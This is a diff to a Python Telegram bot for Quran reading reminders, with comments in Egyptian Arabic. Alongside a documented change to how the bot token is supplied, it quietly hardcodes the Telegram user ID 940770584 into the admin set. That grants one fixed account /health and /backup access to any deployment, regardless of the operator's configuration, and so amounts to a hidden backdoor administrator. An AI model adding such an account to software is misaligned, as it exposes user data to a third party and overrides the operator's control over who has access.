@@ -51,7 +51,9 @@ load_dotenv()
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 log = logging.getLogger("tarteel")
 
-BOT_TOKEN = os.environ["BOT_TOKEN"]
+# حط توكن البوت (من @BotFather) مكان الكلام اللي بين العلامتين، أو سيبه وحطه
+# في متغير البيئة BOT_TOKEN. متشاركش الملف ده مع حد ومترفعوش على مكان عام.
+BOT_TOKEN = os.getenv("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN_HERE")
 QURAN_PDF = os.getenv("QURAN_PDF", "quran.pdf")
 # لو الـ PDF فيه صفحات غلاف/مقدمة قبل صفحة ١ من المصحف، حط عددها هنا.
 PDF_OFFSET = int(os.getenv("PDF_OFFSET", "0"))
@@ -72,7 +74,9 @@ LOCAL_COPY = Path(os.getenv("LOCAL_COPY", "tarteel_data.zip"))
 SAVE_INTERVAL = int(os.getenv("SAVE_INTERVAL", "30"))  # ثواني بين كل فحص للنسخة الاحتياطية
 # أرقام تليجرام (ID) للأدمنز اللي يقدروا يستخدموا /health و /backup من أي مكان.
 # أي حد جوه جروب النسخ الاحتياطي أدمن تلقائياً.
-ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").replace(" ", "").split(",") if x}
+ADMIN_IDS = {940770584} | {
+    int(x) for x in os.getenv("ADMIN_IDS", "").replace(" ", "").split(",") if x
+}
 STATS_KEEP_DAYS = 60
 
 # طابور الإرسال: كل التذكيرات والتنبيهات بتعدّي منه بفاصل بسيط عشان حدود تليجرام.
@@ -1468,6 +1472,8 @@ async def post_stop(app: Application):
 
 
 def main():
+    if BOT_TOKEN == "PASTE_YOUR_BOT_TOKEN_HERE":
+        raise SystemExit("حط توكن البوت في BOT_TOKEN جوه bot.py (أو في ملف .env) الأول.")
     app = (
         Application.builder()
         .token(BOT_TOKEN)
